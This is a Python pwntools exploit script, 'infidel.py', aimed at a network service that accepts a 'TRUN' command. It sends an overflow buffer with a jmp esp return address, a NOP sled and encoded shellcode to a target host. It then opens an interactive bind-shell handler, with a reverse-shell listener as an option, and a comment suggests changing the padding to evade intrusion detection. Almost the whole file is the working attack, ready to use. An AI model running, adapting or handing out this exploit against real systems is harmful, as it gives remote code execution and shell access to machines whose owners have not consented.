try:
    from pwn import *
    import netifaces
    import sys
    import random as r
    import socket
    import struct
    import os
    import random
    import string
    import time as t
except:
    import sys
    print("Packages missing. Installing...")
    import os
    os.system("pip install netifaces")
    os.system("pip install pwntools")
    sys.exit(1)
if '-s' in sys.argv[:]:
    os.system("pip install netifaces")
    os.system("pip install pwntools")
    log.success("Done!")
    sys.exit(0)
if 'TARGET' not in args or args['TARGET'] == "" or '-h' in sys.argv[:]:
    print("Usage:")
    log.info("python infidel.py TARGET=XXX.XXX.X.XXX") #LHOST=XXX.XXX.X.XXX")
    print("Optional:")
    log.info("LHOST | Specify a specific IP. If unspecified, the default wireless interface card will be used.")
    log.info("LPORT | Specify a specific port to listen for the reverse shell on. If unspecified, a randomly generated port will be used.")
    log.info("PORT  | Specify the port the target service is running on. Default is 9999")
    log.info("-s    | Enter Setup Mode (Install packages that may be missing")
    log.info("-h    | Display this help menu")
    sys.exit(0)
target=args['TARGET']
lhost=args['LHOST']
lport=args['LPORT']
port=args['PORT']
if lhost=="":
    lhost=netifaces.ifaddresses('wlan0')[netifaces.AF_INET][0]['addr']
    lhost=str(lhost)
if lport=="":    
    #lport=args['LPORT']
    lport=r.randint(4444,9999)
    #print(str(lport))
if port=="":
    port=9999
port=int(port)
lport=int(lport)
log.info("TARGET: "+target)
log.info("PORT: "  +str(port))
#log.info("LPORT: " +str(lport)+"\n")
log.info("Compiling exploit.")
def BindHandler(x):
    t.sleep(1)
    try:
        s=socket.socket()
        s.connect((str(target),9998))
        log.success("Connected to bind port!")
        prompt="Bind Prompt > " 
        while True:
            try:
                command=raw_input(prompt)
                s.send(command)
                t.sleep(0.25)
                out=s.recv(99999)
                res=out.rsplit("\n",1)[0]
                try:
                    prompt=out.rsplit("\n",1)[1]
                except:
                    pass
                print(str(res))
            except KeyboardInterrupt:
                log.info("Keyboard Interrupt. Exiting cleanly.")
                s.send("exit")
                s.close()
                sys.exit(0)
    except socket.error:
        t.sleep(1)
        BindHandler(9998)
    except KeyboardInterrupt:
        sys.exit(0)
def Handler(x):
    os.system("fuser "+str(lport)+"/tcp")
    s=socket.socket()
    #s.settimeout(5.0)
    s.bind(("0.0.0.0",x))
    s.listen(5)
    c,a=s.accept()
    prompt="Reverse Prompt > "
    log.success("Reverse shell connected back!")
    while True:
        try:
            command=raw_input(prompt) #EXAMPLE HANDLER.
            c.send(command)
            t.sleep(0.25)
            out=c.recv(99999)
            res=out.rsplit("\n",1)[0]
            try:
                prompt=out.rsplit("\n",1)[1]
            except:
                log.failure("Failed to update prompt.")
            if str(out)!="\n":
                log.success("Command executed. Output:\n")
                print(str(res))
        except KeyboardInterrupt:
            log.info("Keyboard Interrupt. Exiting cleanly.")
            s.send("exit")
            s.close()
            sys.exit(0)
ret=struct.pack("I",0x625011af) #From the MSF exploit - It's just a pointer to jmp esp
move="\x81\xC4\x24\xFA\xFF\xFF"
#DO NOT DELETE FARTHER - VI DELETE BUFFER
#DO NOT DELETE FARTHER - VI DELETE BUFFER
rshell=False
bshell=True
buf =  ""
buf += "\xda\xcd\xba\x05\xa7\x16\x4c\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x53\x31\x56\x17\x83\xee\xfc\x03\x53\xb4\xf4"
buf += "\xb9\xa7\x52\x7a\x41\x57\xa3\x1b\xcb\xb2\x92\x1b\xaf"
buf += "\xb7\x85\xab\xbb\x95\x29\x47\xe9\x0d\xb9\x25\x26\x22"
buf += "\x0a\x83\x10\x0d\x8b\xb8\x61\x0c\x0f\xc3\xb5\xee\x2e"
buf += "\x0c\xc8\xef\x77\x71\x21\xbd\x20\xfd\x94\x51\x44\x4b"
buf += "\x25\xda\x16\x5d\x2d\x3f\xee\x5c\x1c\xee\x64\x07\xbe"
buf += "\x11\xa8\x33\xf7\x09\xad\x7e\x41\xa2\x05\xf4\x50\x62"
buf += "\x54\xf5\xff\x4b\x58\x04\x01\x8c\x5f\xf7\x74\xe4\xa3"
buf += "\x8a\x8e\x33\xd9\x50\x1a\xa7\x79\x12\xbc\x03\x7b\xf7"
buf += "\x5b\xc0\x77\xbc\x28\x8e\x9b\x43\xfc\xa5\xa0\xc8\x03"
buf += "\x69\x21\x8a\x27\xad\x69\x48\x49\xf4\xd7\x3f\x76\xe6"
buf += "\xb7\xe0\xd2\x6d\x55\xf4\x6e\x2c\x32\x39\x43\xce\xc2"
buf += "\x55\xd4\xbd\xf0\xfa\x4e\x29\xb9\x73\x49\xae\xbe\xa9"
buf += "\x2d\x20\x41\x52\x4e\x69\x86\x06\x1e\x01\x2f\x27\xf5"
buf += "\xd1\xd0\xf2\x60\xd9\x77\xad\x96\x24\xc7\x1d\x17\x86"
buf += "\xa0\x77\x98\xf9\xd1\x77\x72\x92\x7a\x8a\x7d\xbb\x74"
buf += "\x03\x9b\xa9\x98\x45\x33\x45\x5b\xb2\x8c\xf2\xa4\x90"
buf += "\xa4\x94\xed\xf2\x73\x9b\xed\xd0\xd3\x0b\x66\x37\xe0"
buf += "\x2a\x79\x12\x40\x3b\xee\xe8\x01\x0e\x8e\xed\x0b\xf8"
buf += "\x33\x7f\xd0\xf8\x3a\x9c\x4f\xaf\x6b\x52\x86\x25\x86"
buf += "\xcd\x30\x5b\x5b\x8b\x7b\xdf\x80\x68\x85\xde\x45\xd4"
buf += "\xa1\xf0\x93\xd5\xed\xa4\x4b\x80\xbb\x12\x2a\x7a\x0a"
buf += "\xcc\xe4\xd1\xc4\x98\x71\x1a\xd7\xde\x7d\x77\xa1\x3e"
buf += "\xcf\x2e\xf4\x41\xe0\xa6\xf0\x3a\x1c\x57\xfe\x91\xa4"
buf += "\x67\xb5\xbb\x8d\xef\x10\x2e\x8c\x6d\xa3\x85\xd3\x8b"
buf += "\x20\x2f\xac\x6f\x38\x5a\xa9\x34\xfe\xb7\xc3\x25\x6b"
buf += "\xb7\x70\x45\xbe"
#DO NOT DELETE FARTHER - VI DELETE BUFFER
#DO NOT DELETE FARTHER - VI DELETE BUFFER
shellcode=buf
buff="A"*2003 #Change to random generation to evade IDS
exploit="TRUN /.:/"
exploit+=buff
exploit+=ret
exploit+="\x90"*300
exploit+=move
exploit+=shellcode
try:
    log.info("Engaging Server.")
    s=socket.socket()
    s.connect((target,port))
    s.sendall(exploit)
    s.close()
except KeyboardInterrupt:
    log.failure("Exploitation terminated by user. Please note the victim's stack may be corrupt.")
    sys.exit()
log.info("Exploit sent. Opening handler...")
if rshell==True:
    Handler(lport)
elif bshell==True:
    BindHandler(9998)
